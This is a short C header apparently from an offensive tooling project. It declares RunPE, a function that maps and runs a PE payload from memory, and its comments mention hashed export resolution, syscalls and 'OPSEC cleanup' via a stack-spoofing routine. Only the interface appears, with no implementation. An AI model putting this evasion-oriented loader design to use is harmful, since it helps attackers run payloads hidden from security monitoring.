#ifndef RUNPE_H
#define RUNPE_H

#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * Maps and executes a PE from memory in the current process.
 *
 * exportHash  — fixed-seed Djb2 hash of the DLL export to invoke after DllMain.
 *               Pass 0 to skip export invocation (always ignored for EXE payloads).
 * pExportArg  — null-terminated string passed to the export function, or NULL.
 * PreExecuteCb — called after all syscalls complete, just before handing over to the payload.
 *                Use for OPSEC cleanup (e.g., VehSpoof_Cleanup).
 */
DWORD RunPE(BYTE* pPeFile, DWORD exportHash, LPCSTR pExportArg, void (*PreExecuteCb)(void));

#ifdef __cplusplus
}
#endif

#endif /* RUNPE_H */
